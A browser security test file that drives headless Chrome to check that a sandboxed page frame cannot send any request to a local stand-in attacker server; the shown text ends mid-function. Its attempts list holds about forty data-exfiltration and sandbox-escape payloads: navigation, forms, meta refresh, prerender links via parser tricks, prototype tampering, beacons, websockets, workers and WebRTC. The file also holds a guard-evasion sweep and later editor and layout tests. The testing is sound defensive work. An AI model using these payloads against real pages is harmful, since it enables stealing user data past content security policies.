import { spawn, type ChildProcess } from "node:child_process";
import { createSocket, type Socket } from "node:dgram";
import { existsSync, mkdtempSync, readFileSync, rmSync } from "node:fs";
import { createServer, type Server } from "node:http";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { afterAll, beforeAll, describe, expect, it } from "vitest";

import { GUARD_SCRIPT, pageDocument, wrapperDocument } from "@kos/shared";
import { DONE_MS, REVEAL_MS, ownerIn, revealAllowed, saveAllowed } from "./frameheight.js";

/**
 * Every way out of a page's frame, tried in a real Chrome. Each attempt aims
 * at a server standing in for an attacker; the test holds that it is sent no
 * request at all, and that the page was really running when it tried. A
 * control runs the flat frame KOS had before, which does leak, so the test is
 * known to see a leak when there is one. Skipped without Chrome.
 *
 * What it does not hold: a navigation attempt still makes Chrome open a
 * connection (DNS and TCP, no request) to the host it names, before the
 * policy refuses it (artifactdoc.ts). It counts requests, not connections.
 */

const CHROME = ["/Applications/Google Chrome.app/Contents/MacOS/Google Chrome", "/usr/bin/google-chrome", "/usr/bin/google-chrome-stable", "/usr/bin/chromium"].find((p) => existsSync(p));

/** The attempts, each a script the page runs once it is up; `E` is the attacker. */
function attempts(E: string): Record<string, string> {
  const link = (how: string): string => how;
  return {
    href: `location.href = "${E}/href?d=1"`,
    assign: `location.assign("${E}/assign?d=1")`,
    replace: `location.replace("${E}/replace?d=1")`,
    open: `window.open("${E}/open?d=1")`,
    form: `const f = document.createElement("form"); f.method = "post"; f.action = "${E}/form"; document.body.append(f); f.submit()`,
    formMarkup: `document.body.innerHTML = '<form action="${E}/formmarkup"></form>'; document.forms[0].submit()`,
    metaRefresh: `const m = document.createElement("meta"); m.httpEquiv = "refresh"; m.content = "0;url=${E}/meta"; document.head.append(m)`,
    metaMarkup: `document.head.insertAdjacentHTML("beforeend", '<meta http-equiv="refresh" content="0;url=${E}/metamarkup">')`,
    anchor: `const a = document.createElement("a"); a.href = "${E}/aself?d=1"; document.body.append(a); a.click()`,
    anchorBlank: `const a = document.createElement("a"); a.href = "${E}/ablank"; a.target = "_blank"; document.body.append(a); a.click()`,
    anchorTop: `const a = document.createElement("a"); a.href = "${E}/atop"; a.target = "_top"; document.body.append(a); a.click()`,
    download: `const a = document.createElement("a"); a.href = "${E}/download"; a.download = "x"; document.body.append(a); a.click()`,
    top: `top.location = "${E}/top"`,
    parent: `parent.location = "${E}/parent"`,
    history: `try { history.pushState({}, "", "${E}/push"); } catch (e) {} location.reload()`,
    iframeHash: `const f = document.createElement("iframe"); f.src = "${E}/frame#d=1"; document.body.append(f)`,
    iframeMarkup: `document.body.innerHTML = '<iframe src="${E}/framemarkup#d=1"></iframe>'`,
    dataNav: `location.href = "data:text/html,<script>fetch('${E}/datanav')<\\/script>"`,
    blobNav: `location.href = URL.createObjectURL(new Blob(["<script>fetch('${E}/blobnav')<\\/script>"], { type: "text/html" }))`,
    prerender: link(`const l = document.createElement("link"); l.rel = "prerender"; l.href = "${E}/prerender"; document.head.append(l)`),
    prerenderMarkup: link(`document.body.insertAdjacentHTML("beforeend", '<link rel="pre' + 'render" href="${E}/prerendermarkup">')`),
    prerenderWrite: link(`document.write('<link rel="prerender" href="${E}/prerenderwrite">')`),
    prerenderParser: link(`const d = new DOMParser().parseFromString('<link rel="prerender" href="${E}/prerenderparser">', "text/html"); document.head.append(document.adoptNode(d.querySelector("link")))`),
    prerenderNS: link(`const l = document.createElementNS("http://www.w3.org/1999/xhtml", "link"); l.rel = "prerender"; l.href = "${E}/prerenderns"; document.head.append(l)`),
    prerenderRange: link(`document.head.append(document.createRange().createContextualFragment('<link rel="prerender" href="${E}/prerenderrange">'))`),
    prerenderShadow: link(`const h = document.createElement("div"); document.body.append(h); h.attachShadow({ mode: "open" }).innerHTML = '<link rel="prerender" href="${E}/prerendershadow">'`),
    prerenderTemplate: link(`const t = document.createElement("template"); t.innerHTML = '<link rel="prerender" href="${E}/prerendertemplate">'; document.head.append(t.content.cloneNode(true))`),
    prerenderRealm: link(`const f = document.createElement("iframe"); document.body.append(f); const l = f.contentDocument.createElement("link"); l.rel = "prerender"; l.href = "${E}/prerenderrealm"; document.head.append(l)`),
    prefetchHints: link(`for (const rel of ["prefetch", "preload", "preconnect", "dns-prefetch", "modulepreload"]) { const l = document.createElement("link"); l.rel = rel; l.as = "fetch"; l.href = "${E}/" + rel; document.head.append(l); }`),
    speculation: `const s = document.createElement("script"); s.type = "speculationrules"; s.text = JSON.stringify({ prefetch: [{ source: "list", urls: ["${E}/speculation"] }] }); document.head.append(s)`,
    fetch: `fetch("${E}/fetch").catch(() => {})`,
    beacon: `navigator.sendBeacon("${E}/beacon", "d")`,
    socket: `try { new WebSocket("${E.replace("http", "ws")}/ws"); } catch (e) {} try { new EventSource("${E}/sse"); } catch (e) {}`,
    worker: `try { new Worker(URL.createObjectURL(new Blob(["fetch('${E}/worker')"], { type: "text/javascript" }))); } catch (e) {}`,
    css: `const s = document.createElement("style"); s.textContent = "body{background:url(${E}/css)} @font-face{font-family:x;src:url(${E}/font)}"; document.head.append(s)`,
    image: `new Image().src = "${E}/image"; document.body.insertAdjacentHTML("beforeend", '<svg><image href="${E}/svgimage"/></svg>')`,
    object: `document.body.insertAdjacentHTML("beforeend", '<object data="${E}/object"></object>')`,
    // A link made by a document's own parser, never by a factory the guard holds.
    prerenderCreateDocument: link(`const d = document.implementation.createDocument(XHTML, "link", null); const l = d.documentElement; l.setAttribute("rel", "prerender"); l.setAttribute("href", "${E}/createdocument"); document.head.append(document.adoptNode(l))`),
    prerenderXhtml: link(`const d = new DOMParser().parseFromString('<x:link xmlns:x="' + XHTML + '" rel="prerender" href="${E}/xhtml"/>', "application/xhtml+xml"); document.head.appendChild(d.documentElement)`),
    prerenderEntity: link(`const d = new DOMParser().parseFromString('<!DOCTYPE r [<!ENTITY e "&#60;link xmlns=&#34;' + XHTML + '&#34; rel=&#34;prerender&#34; href=&#34;${E}/entity&#34;/&#62;">]><r>&e;</r>', "application/xml"); document.head.append(...d.documentElement.childNodes)`),
    prerenderSvg: link(`const d = new DOMParser().parseFromString('<svg xmlns="http://www.w3.org/2000/svg"><foreignObject><link xmlns="' + XHTML + '" rel="prerender" href="${E}/svg"/></foreignObject></svg>', "image/svg+xml"); document.body.append(document.importNode(d.documentElement, true))`),
    // The page takes back what the guard calls through, then tries again.
    prerenderTampered: link(`Function.prototype.call = Function.prototype.apply = function () { return null }; RegExp.prototype.exec = RegExp.prototype.test = () => null; Object.defineProperty(Node, Symbol.hasInstance, { value: () => false }); const l = document.createElement("link"); l.rel = "prerender"; l.href = "${E}/tampered"; document.head.append(l)`),
    metaClone: `const m = document.querySelector("meta").cloneNode(); m.removeAttribute("charset"); m.httpEquiv = "refresh"; m.content = "0;url=${E}/metaclone"; document.head.append(m)`,
  };
}

const XHTML = "http://www.w3.org/1999/xhtml";

/**
 * Every way this test knows to make an element, crossed with every way to put
 * a node into a document. A page runs the lot, each in its own try, then
 * counts the elements no policy governs that ended up in its document: the
 * guard should leave none, whatever made them and whatever placed them.
 */
const FORBIDDEN = ["link", "meta", "iframe", "form", "base", "object", "embed", "script", "frame"];
const SWEEP = String.raw`
const makers = {
  createElement: (t) => document.createElement(t),
  createElementNS: (t) => document.createElementNS(XHTML, t),
  createElementNSPrefixed: (t) => document.createElementNS(XHTML, "x:" + t),
  createElementNSOther: (t) => document.createElementNS("urn:x", t),
  createDocument: (t) => document.implementation.createDocument(XHTML, t, null).documentElement,
  createHTMLDocument: (t) => document.implementation.createHTMLDocument("").createElement(t),
  domParserHtml: (t) => new DOMParser().parseFromString("<" + t + ">", "text/html").querySelector(t),
  domParserXhtml: (t) => new DOMParser().parseFromString("<x:" + t + ' xmlns:x="' + XHTML + '"/>', "application/xhtml+xml").documentElement,
  domParserEntity: (t) => new DOMParser().parseFromString('<!DOCTYPE r [<!ENTITY e "&#60;' + t + ' xmlns=&#34;' + XHTML + '&#34;/&#62;">]><r>&e;</r>', "application/xml").documentElement.firstChild,
  domParserSvg: (t) => new DOMParser().parseFromString('<svg xmlns="http://www.w3.org/2000/svg"><foreignObject><' + t + ' xmlns="' + XHTML + '"/></foreignObject></svg>', "image/svg+xml").documentElement,
  innerHTML: (t) => { const d = document.createElement("div"); d.innerHTML = "<" + t + ">"; return d; },
  template: (t) => { const x = document.createElement("template"); x.innerHTML = "<" + t + ">"; return x.content; },
  range: (t) => document.createRange().createContextualFragment("<" + t + ">"),
  setHTMLUnsafe: (t) => { const d = document.createElement("div"); d.setHTMLUnsafe("<" + t + ">"); return d; },
  parseHTMLUnsafe: (t) => Document.parseHTMLUnsafe("<" + t + ">").querySelector(t),
  clone: (t) => { const n = document.querySelector(t); return n && n.cloneNode(true); },
};
const placers = {
  appendChild: (n) => document.body.appendChild(n),
  insertBefore: (n) => document.body.insertBefore(n, document.body.firstChild),
  replaceChild: (n) => { const s = document.createElement("span"); document.body.append(s); document.body.replaceChild(n, s); },
  append: (n) => document.body.append(n),
  prepend: (n) => document.head.prepend(n),
  replaceChildren: (n) => { const s = document.createElement("div"); document.body.append(s); s.replaceChildren(n); },
  replaceWith: (n) => { const s = document.createElement("span"); document.body.append(s); s.replaceWith(n); },
  before: (n) => document.body.firstChild.before(n),
  after: (n) => document.body.firstChild.after(n),
  textBefore: (n) => { const s = document.createTextNode(""); document.body.append(s); s.before(n); },
  insertAdjacentElement: (n) => document.body.insertAdjacentElement("beforeend", n),
  rangeInsert: (n) => { const r = document.createRange(); r.selectNodeContents(document.body); r.insertNode(n); },
  rangeSurround: (n) => { const r = document.createRange(); r.selectNodeContents(document.body.lastChild || document.body); r.surroundContents(n); },
  adopt: (n) => document.body.append(document.adoptNode(n)),
  import: (n) => document.body.append(document.importNode(n, true)),
  shadow: (n) => { const h = document.createElement("div"); document.body.append(h); h.attachShadow({ mode: "open" }).append(n); },
};
const before = {};
for (const t of TAGS) before[t] = document.getElementsByTagNameNS("*", t).length + document.getElementsByTagNameNS("*", "x:" + t).length;
let tried = 0, made = 0;
for (const t of TAGS) for (const make of Object.values(makers)) for (const place of Object.values(placers)) {
  tried++;
  let n; try { n = make(t); } catch (e) { continue; }
  if (!n) continue;
  made++;
  try { place(n); } catch (e) {}
}
const shadows = [...document.querySelectorAll("div")].map((d) => d.shadowRoot).filter(Boolean);
const placed = {};
for (const t of TAGS) {
  let k = document.getElementsByTagNameNS("*", t).length + document.getElementsByTagNameNS("*", "x:" + t).length - before[t];
  for (const r of shadows) k += r.querySelectorAll(t).length;
  if (k) placed[t] = k;
}
top.postMessage({ census: { tried, made, placed } }, "*");
`;

/** A page that says it is up, tries one way out, then says it tried. */
const attempt = (code: string): string => `<p>page</p><script>top.postMessage("alive", "*"); setTimeout(() => { try { ${code} } catch (e) {} top.postMessage("tried", "*"); }, 50)</script>`;

/** A document as an iframe's srcdoc attribute holds it. */
const srcdoc = (doc: string): string => doc.replace(/&/g, "&amp;").replace(/"/g, "&quot;");

/** The most any one thing is waited for: a bound, so a slow machine fails a step, not the whole run. */
const BOUND_MS = 15_000;
/**
 * How long to watch for what must not happen (a request, a second report)
 * once what starts it has happened. A request a page sends lands in a few
 * milliseconds; this is room for a slow machine, not a guess at a race.
 */
const QUIET_MS = 500;
/**
 * The same watch for the ways out, the test that holds the line: a request a
 * busy machine sends late is still counted against the attempt that sent it.
 */
const ESCAPE_QUIET_MS = 1_500;
const pause = (ms: number): Promise<void> => new Promise((r) => setTimeout(r, ms));

interface Run {
  alive: boolean;
  requests: string[];
  /** What the page told the dashboard, when it says more than that it is up. */
  said?: string;
}

describe.skipIf(!CHROME)("a page's frame in a real Chrome", () => {
  let evil: Server;
  let host: Server;
  let chrome: ChildProcess;
  let profile = "";
  let E = "";
  let base = "";
  const requests: string[] = [];
  /** Every request the attacker's server is sent, never cleared between runs. */
  const log: string[] = [];
  const pages = new Map<string, string>();
  let send: (method: string, params?: Record<string, unknown>) => Promise<Record<string, unknown>>;
  let close = (): void => undefined;

  const listen = (server: Server): Promise<number> =>
    new Promise((resolve) => server.listen(0, "127.0.0.1", () => resolve((server.address() as { port: number }).port)));

  beforeAll(async () => {
    evil = createServer((req, res) => {
      requests.push(req.url ?? "");
      log.push(req.url ?? "");
      res.writeHead(200, { "content-type": "text/html", "access-control-allow-origin": "*" }).end("<p>evil</p>");
    });
    E = `http://127.0.0.1:${await listen(evil)}`;
    host = createServer((req, res) => res.writeHead(200, { "content-type": "text/html" }).end(pages.get(req.url ?? "") ?? ""));
    base = `http://127.0.0.1:${await listen(host)}`;
    profile = mkdtempSync(join(tmpdir(), "kos-artifact-chrome-"));
    const port = 9400 + Math.floor(Math.random() * 400);
    chrome = spawn(CHROME!, ["--headless=new", `--remote-debugging-port=${port}`, `--user-data-dir=${profile}`, "--no-first-run", "about:blank"], { stdio: "ignore" });
    let version: { webSocketDebuggerUrl: string } | undefined;
    for (let i = 0; i < 300 && !version; i++) {
      version = await fetch(`http://127.0.0.1:${port}/json/version`).then((r) => r.json() as Promise<{ webSocketDebuggerUrl: string }>).catch(() => undefined);
      if (!version) await pause(100);
    }
    const ws = new WebSocket(version!.webSocketDebuggerUrl);
    await new Promise((r) => (ws.onopen = r));
    let n = 0;
    const wait = new Map<number, (m: { result?: Record<string, unknown> }) => void>();
    ws.onmessage = (e) => {
      const m = JSON.parse(String(e.data)) as { id?: number; result?: Record<string, unknown> };
      if (m.id) wait.get(m.id)?.(m);
    };
    const raw = (method: string, params: Record<string, unknown> = {}, sessionId?: string): Promise<Record<string, unknown>> =>
      new Promise((resolve, reject) => {
        const id = ++n;
        // An answer Chrome never sends fails this call, not the test's whole timeout.
        const timer = setTimeout(() => (wait.delete(id), reject(new Error(`Chrome did not answer ${method} in ${BOUND_MS} ms`))), BOUND_MS);
        wait.set(id, (m) => (clearTimeout(timer), wait.delete(id), resolve(m.result ?? {})));
        ws.send(JSON.stringify({ id, method, params, ...(sessionId ? { sessionId } : {}) }));
      });
    const target = await raw("Target.createTarget", { url: "about:blank" });
    const session = (await raw("Target.attachToTarget", { targetId: target.targetId, flatten: true })).sessionId as string;
    send = (method, params = {}) => raw(method, params, session);
    close = () => ws.close();
  }, 30_000);

  afterAll(async () => {
    close();
    // Chrome writes its profile as it goes; the folder goes once it has exited.
    if (chrome && chrome.exitCode === null) await new Promise((r) => (chrome.once("exit", r), chrome.kill()));
    evil?.close();
    host?.close();
    // Chrome's helpers can still be writing the profile after the browser exits; a temp
    // folder left behind must not fail the run, so the delete retries and then lets go.
    if (profile) {
      try {
        rmSync(profile, { recursive: true, force: true, maxRetries: 10, retryDelay: 200 });
      } catch {
        // The OS clears tmp; the test's verdict stands.
      }
    }
  });

  const value = async (expression: string): Promise<unknown> => ((await send("Runtime.evaluate", { expression, returnByValue: true })).result as { value?: unknown } | undefined)?.value;
  /**
   * Wait for what is expected in the browser, up to a bound, rather than guess
   * how long a busy machine takes; past the bound, fail naming what it waited on.
   */
  const until = async (expression: string, bound = BOUND_MS): Promise<void> => {
    for (const end = Date.now() + bound; !(await value(expression)); await pause(50)) {
      if (Date.now() >= end) throw new Error(`Waited ${bound} ms for ${expression}`);
    }
  };
  /** The same, for what reaches this side: a request, a packet. */
  const within = async (seen: () => boolean, bound = BOUND_MS): Promise<void> => {
    for (const end = Date.now() + bound; !seen(); await pause(50)) {
      if (Date.now() >= end) throw new Error(`Waited ${bound} ms for ${seen.toString()}`);
    }
  };

  /** The dashboard's side: the frame as ArtifactPage draws it, around one page, run until it has tried and then a while longer. */
  async function run(name: string, frame: string, quiet = QUIET_MS): Promise<Run> {
    const path = `/${name}`;
    pages.set(path, `<!doctype html><body><script>addEventListener("message", (e) => { if (e.data === "alive") document.title = "alive"; else if (e.data === "tried") document.body.dataset.tried = "1"; else if (e.data && e.data.census) document.body.dataset.said = JSON.stringify(e.data.census); })</script><iframe sandbox="allow-scripts" srcdoc="${srcdoc(frame)}"></iframe></body>`);
    requests.length = 0;
    await send("Page.navigate", { url: `${base}${path}` });
    // Up and tried (a census is said before), then the room a request has to land in, before the next page.
    await until("document.body.dataset.tried === '1'");
    await pause(quiet);
    const said = String(await value("document.body.dataset.said || ''"));
    return { alive: (await value("document.title")) === "alive", requests: [...requests], ...(said ? { said } : {}) };
  }

  const page = (code: string): string => pageDocument({ html: attempt(`const XHTML = "${XHTML}"; ${code}`), tokens: {}, mode: "dark", css: "", libraries: [] });
  /** The same page with the guard taken out, for the controls. */
  const unguarded = (code: string): string => page(code).replace(`<script>${GUARD_SCRIPT}</script>`, "").replace("; require-trusted-types-for 'script'; trusted-types default", "");

  it("sees a leak when there is one: the flat frame KOS had sends a navigation's request", async () => {
    const flat = await run("control", page(attempts(E).href!).replace(/<meta http-equiv="Content-Security-Policy"[^>]*>/, `<meta http-equiv="Content-Security-Policy" content="default-src 'none'; script-src 'unsafe-inline'">`));
    expect(flat.alive).toBe(true);
    // A navigation's request can come after the page's own turn is over: wait for it, up to a bound.
    await within(() => requests.some((r) => r.startsWith("/href")));
    expect(requests.join(" ")).toContain("/href");
  }, 20_000);

  it("sees a placed element when there is one: the sweep without the guard places every kind", async () => {
    const bare = await run("sweep-control", wrapperDocument(unguarded(`const TAGS = ${JSON.stringify(FORBIDDEN)}; ${SWEEP}`)));
    expect(bare.alive).toBe(true);
    const census = JSON.parse(bare.said ?? "{}") as { placed?: Record<string, number> };
    expect(Object.keys(census.placed ?? {}).sort()).toEqual([...FORBIDDEN].sort());
  }, 20_000);

  it("places none of them, made and placed every way there is", async () => {
    const swept = await run("sweep", wrapperDocument(page(`const TAGS = ${JSON.stringify(FORBIDDEN)}; ${SWEEP}`)));
    expect(swept.alive).toBe(true);
    const census = JSON.parse(swept.said ?? "{}") as { tried: number; made: number; placed: Record<string, number> };
    // Some routes do still make one (a parser, a clone of the page's own <meta>); none may place it.
    expect(census.tried).toBe(FORBIDDEN.length * 16 * 16);
    expect(census.made).toBeGreaterThan(0);
    expect(census.placed).toEqual({});
    expect(swept.requests).toEqual([]);
  }, 20_000);

  /*
   * WebRTC reaches the network beside every policy: ICE sends STUN over UDP
   * to whatever server the page names. A listener stands in for one.
   */
  describe("WebRTC", () => {
    const sockets: Socket[] = [];
    /** A STUN server of its own for each run, so a straggler from one is never counted in another. */
    async function stunServer(): Promise<{ url: string; packets: number[] }> {
      const udp = createSocket("udp4");
      sockets.push(udp);
      const packets: number[] = [];
      udp.on("message", (m) => packets.push(m.length));
      await new Promise<void>((r) => udp.bind(0, "127.0.0.1", r));
      return { url: `stun:127.0.0.1:${udp.address().port}`, packets };
    }
    afterAll(() => sockets.forEach((u) => u.close()));
    const offer = (stun: string): string => `const pc = new RTCPeerConnection({ iceServers: [{ urls: "${stun}" }] }); pc.createDataChannel("d"); pc.createOffer().then((o) => pc.setLocalDescription(o))`;

    it("sees the packets when WebRTC is there", async () => {
      const stun = await stunServer();
      const bare = await run("rtc-control", wrapperDocument(unguarded(offer(stun.url))));
      expect(bare.alive).toBe(true);
      await within(() => stun.packets.length > 0);
      expect(stun.packets.length).toBeGreaterThan(0);
    }, 20_000);

    it("sends none from a page", async () => {
      const stun = await stunServer();
      const guarded = await run("rtc", wrapperDocument(page(`${offer(stun.url)}; try { new webkitRTCPeerConnection({}) } catch (e) {}`)));
      expect(guarded.alive).toBe(true);
      expect(stun.packets).toEqual([]);
    }, 20_000);
  });

  /*
   * The bridge's side of a page as tall as its content, against a stand-in
   * for the dashboard that applies each report as it comes (the dashboard's
   * own hold on the height, heightGate, is tested in ArtifactPage.test): the
   * report is the content's height, the page then has no scrollbar of its
   * own, and a link to a place on it, pressed by a real pointer, reports
   * where the place is.
   */
  it("reports a page's content height, which leaves no scroll inside once applied, and a #link reports its place", async () => {
    const html = `<style>body{margin:0}</style><a id="go" href="#end" style="display:block;height:40px">jump</a><div style="height:2600px"></div><h2 id="end" style="margin:0;height:60px">end</h2><script>
      addEventListener("message", (e) => { if (e.data === "probe") top.postMessage({ probe: { scroll: document.scrollingElement.scrollHeight, client: document.scrollingElement.clientHeight, wide: document.scrollingElement.scrollWidth > innerWidth, view: innerHeight } }, "*"); });
    </script>`;
    const frame = wrapperDocument(pageDocument({ html, tokens: {}, mode: "dark", css: "", libraries: [], kind: "page" }));
    pages.set("/fit", `<!doctype html><body style="margin:0"><iframe id="f" sandbox="allow-scripts" style="display:block;border:0;width:600px;height:300px" srcdoc="${srcdoc(frame)}"></iframe><div style="height:2000px"></div><script>
      const f = document.getElementById("f");
      addEventListener("message", (e) => {
        const page = f.contentWindow.frames[0], m = e.data || {};
        if (e.source !== page) return;
        if (m.__kos === "height") {
          f.style.height = Math.min(m.height, 50000) + "px";
          document.body.dataset.heights = String(Number(document.body.dataset.heights || 0) + 1);
          if (m.reveal && navigator.userActivation.isActive) scrollTo({ top: f.getBoundingClientRect().top + scrollY + m.reveal.top });
        }
        if (m.probe) document.body.dataset.probe = JSON.stringify(m.probe);
      });
    </script></body>`);
    await send("Emulation.setDeviceMetricsOverride", { width: 800, height: 600, deviceScaleFactor: 1, mobile: false });
    await send("Page.navigate", { url: `${base}/fit` });
    // Applied, then a while to see it settle rather than report on in a loop.
    await until(`document.getElementById("f").getBoundingClientRect().height === 2700`);
    await pause(QUIET_MS);
    await value(`document.getElementById("f").contentWindow.frames[0].postMessage("probe", "*")`);
    await until("document.body.dataset.probe");
    const probe = JSON.parse(String(await value("document.body.dataset.probe || '{}'"))) as { scroll?: number; client?: number; wide?: boolean };
    expect(await value(`document.getElementById("f").getBoundingClientRect().height`)).toBe(2700);
    // No scroll inside: the page's document is exactly as tall as its frame.
    expect(probe.scroll).toBe(probe.client);
    expect(probe.client).toBe(2700);
    expect(probe.wide).toBe(false);
    // It settles: a report or two, not a loop.
    expect(Number(await value("document.body.dataset.heights"))).toBeLessThanOrEqual(3);
    expect(await value("scrollY")).toBe(0);
    for (const type of ["mousePressed", "mouseReleased"]) await send("Input.dispatchMouseEvent", { type, x: 20, y: 20, button: "left", clickCount: 1 });
    await until("scrollY > 0");
    expect(await value("scrollY")).toBe(2640);
    await send("Emulation.clearDeviceMetricsOverride");
  }, 20_000);

  /*
   * The doc editor, on the doc's runtime as the dashboard inlines it, typed
   * into by a real keyboard: markdown at a line's start, bold around words,
   * a block from the "/" menu, then a save of its own through kos.save once
   * the typing stops, which the bridge sends only at the owner's hand.
   */
  it("edits a doc in place, markdown and the slash menu, and saves on its own through the bridge", async () => {
    const { build } = await import("esbuild");
    const bundled = await build({ entryPoints: [join(import.meta.dirname, "../../pagelib/doc.ts")], bundle: true, write: false, format: "iife", target: "chrome120", charset: "ascii", logLevel: "silent" });
    const runtime = bundled.outputFiles[0]!.text;
    // The "/" menu, as it shows: its picked block told to the dashboard, so the test presses Enter on what it sees.
    const html = `<article data-doc><p><br></p><h2>Next</h2></article><script>
      new MutationObserver(() => { const m = document.querySelector(".doc-slash"); if (m && !m.hidden) top.postMessage({ menu: m.querySelector('[aria-selected="true"]')?.textContent ?? "" }, "*"); }).observe(document.body, { subtree: true, childList: true, attributes: true });
    </script>`;
    const frame = wrapperDocument(pageDocument({ html, tokens: {}, mode: "dark", css: "", libraries: [runtime], kind: "doc" }));
    // The dashboard's own checks, as ArtifactPage makes them (frameheight.ts), run here in the browser.
    const checks = `const REVEAL_MS = ${REVEAL_MS}, DONE_MS = ${DONE_MS}; const ownerIn = ${ownerIn.toString()}; const saveAllowed = ${saveAllowed.toString()}; const revealAllowed = ${revealAllowed.toString()};`;
    pages.set("/doc", `<!doctype html><body style="margin:0"><button id="elsewhere">elsewhere</button><iframe id="f" sandbox="allow-scripts" style="display:block;border:0;width:800px;height:560px" srcdoc="${srcdoc(frame)}"></iframe><script>
      ${checks}
      const f = document.getElementById("f");
      let gestureAt = -Infinity, ports = 0;
      addEventListener("message", (e) => {
        const page = f.contentWindow.frames[0], m = e.data || {};
        if (e.source !== page) return;
        if (typeof m.menu === "string") { document.body.dataset.menu = m.menu; return; }
        // The bridge's channel for the owner's presses and keys, taken once as ArtifactPage takes it.
        if (m.__kos === "gestures") { ports += 1; document.body.dataset.ports = String(ports); if (ports === 1) e.ports[0].onmessage = () => { gestureAt = performance.now(); document.body.dataset.gestures = String(Number(document.body.dataset.gestures || 0) + 1); }; return; }
        // The dashboard's edit bar: Edit once the doc says it can be edited.
        if (m.__kos === "edit" && !m.editing && !document.body.dataset.asked) { document.body.dataset.asked = "1"; page.postMessage({ __kos: "edit-do", action: "edit" }, "*"); }
        if (m.__kos !== "call" || m.method !== "save") return;
        // What the dashboard checks before it relays a save: the owner's hand in this frame, as the browser reports it here.
        document.body.dataset.active = String(saveAllowed(f, undefined));
        document.body.dataset.reveal = String(revealAllowed(f, gestureAt));
        document.body.dataset.saves = String(Number(document.body.dataset.saves || 0) + 1);
        document.body.dataset.saved = m.args.edit.doc;
        page.postMessage({ __kos: "reply", id: m.id, result: {} }, "*");
      });
    </script></body>`);
    await send("Emulation.setDeviceMetricsOverride", { width: 800, height: 600, deviceScaleFactor: 1, mobile: false });
    await send("Page.navigate", { url: `${base}/doc` });
    await until("document.body.dataset.ports === '1'");
    // A while for a press or a second channel that must not come.
    await pause(QUIET_MS);
    // Before the owner touches it, nothing is theirs: no hand in the frame, no press over the channel, which came once.
    expect(await value("ownerIn(f)")).toBe(false);
    expect(await value("document.body.dataset.ports")).toBe("1");
    expect(await value("document.body.dataset.gestures || '0'")).toBe("0");
    const key = async (k: string): Promise<void> => {
      const enter = k === "Enter";
      await send("Input.dispatchKeyEvent", { type: "keyDown", key: k, text: enter ? "\r" : k, ...(enter ? { code: "Enter", windowsVirtualKeyCode: 13 } : {}) });
      await send("Input.dispatchKeyEvent", { type: "keyUp", key: k, ...(enter ? { code: "Enter", windowsVirtualKeyCode: 13 } : {}) });
    };
    const type = async (text: string): Promise<void> => {
      for (const k of text) await key(k);
    };
    // Into the first line, as the owner would (below the dashboard's own button).
    for (const t of ["mousePressed", "mouseReleased"]) await send("Input.dispatchMouseEvent", { type: t, x: 200, y: 70, button: "left", clickCount: 1 });
    // The press is the owner's hand in the frame, and the frame's channel told the dashboard of it, just now:
    // read all three the moment the stamp lands, since the window for a jump is half a second.
    let seen: unknown;
    for (const end = Date.now() + 5_000; !seen && Date.now() < end; ) {
      seen = await value("Number(document.body.dataset.gestures || 0) > 0 ? [ownerIn(f), revealAllowed(f, gestureAt)] : null");
      if (!seen) await pause(20);
    }
    expect(seen).toEqual([true, true]);
    await type("## Water");
    await key("Enter");
    await type("it is **wet** now");
    await key("Enter");
    // Enter only once the menu shows the divider picked.
    await type("/div");
    await until("(document.body.dataset.menu || '').startsWith('Divider')");
    await key("Enter");
    await until("document.body.dataset.saved");
    // A while for a second save that must not come.
    await pause(QUIET_MS);
    const saved = String(await value("document.body.dataset.saved || ''"));
    expect(saved).toContain("<h2>Water</h2>");
    expect(saved).toMatch(/<p>it is(&nbsp;| )<strong>wet<\/strong>(&nbsp;| )now<\/p><hr><h2>Next<\/h2>/);
    expect(saved).toContain("<hr>");
    expect(saved).not.toContain("/div");
    expect(saved).not.toContain("contenteditable");
    // One save for the run of typing, not one a key; and the owner's hand was still counted when it went, here and in the frame (whose bridge refuses one without it).
    expect(Number(await value("document.body.dataset.saves"))).toBe(1);
    expect(await value("document.body.dataset.active")).toBe("true");
    // Two seconds on, the press is too long ago for a jump to scroll the dashboard.
    expect(await value("revealAllowed(f, gestureAt)")).toBe(false);
    // A press on the dashboard itself takes the hand out of the frame.
    for (const t of ["mousePressed", "mouseReleased"]) await send("Input.dispatchMouseEvent", { type: t, x: 20, y: 8, button: "left", clickCount: 1 });
    await until("!ownerIn(f)");
    expect(await value("ownerIn(f)")).toBe(false);
    expect(await value("saveAllowed(f, undefined)")).toBe(false);
    await send("Emulation.clearDeviceMetricsOverride");
  }, 30_000);

  /** The sheet's runtime, bundled once for the sheet tests. */
  let sheetRuntime: string | undefined;
  /**
   * A sheet page on the sheet's runtime and the kit's CSS as the dashboard
   * inlines them, framed as the dashboard frames it, with probes the test asks
   * for by name: each is a function's source, run in the page, whose value
   * comes back over postMessage.
   */
  async function sheetPage(path: string, html: string, probes: Record<string, string>): Promise<void> {
    if (!sheetRuntime) {
      const { build } = await import("esbuild");
      const bundled = await build({ entryPoints: [join(import.meta.dirname, "../../pagelib/sheet.ts")], bundle: true, write: false, format: "iife", target: "chrome120", charset: "ascii", logLevel: "silent" });
      sheetRuntime = bundled.outputFiles[0]!.text;
    }
    const answer = `<script>
      const probes = { ${Object.entries(probes).map(([name, fn]) => `${JSON.stringify(name)}: ${fn}`).join(", ")} };
      addEventListener("message", (e) => { const ask = e.data && e.data.ask; if (probes[ask]) top.postMessage({ answer: { ask, value: probes[ask]() } }, "*"); });
    </script>`;
    const css = ["kit.css", "page.css"].map((f) => readFileSync(join(import.meta.dirname, "../../../kit/src", f), "utf8")).join("\n");
    const frame = wrapperDocument(pageDocument({ html: html + answer, tokens: {}, mode: "dark", css, libraries: [sheetRuntime], kind: "sheet" }));
    pages.set(path, `<!doctype html><meta name="viewport" content="width=device-width"><body style="margin:0"><iframe id="f" sandbox="allow-scripts" style="display:block;border:0;width:100%;height:700px" srcdoc="${srcdoc(frame)}"></iframe><script>
      window.answers = {};
      addEventListener("message", (e) => { if (e.data && e.data.answer) answers[e.data.answer.ask] = JSON.stringify(e.data.answer.value); });
    </script></body>`);
    await send("Page.navigate", { url: `${base}${path}` });
  }
  /** Ask the sheet page a probe until its answer passes `ready`, up to a bound; the last answer, which a test then holds. */
  async function ask<T>(name: string, ready: (v: T) => boolean = () => true): Promise<T> {
    let last: T | undefined;
    for (const end = Date.now() + BOUND_MS; Date.now() < end; await pause(100)) {
      await value(`delete answers[${JSON.stringify(name)}]; document.getElementById("f").contentWindow.frames[0].postMessage({ ask: ${JSON.stringify(name)} }, "*")`);
      await pause(50);
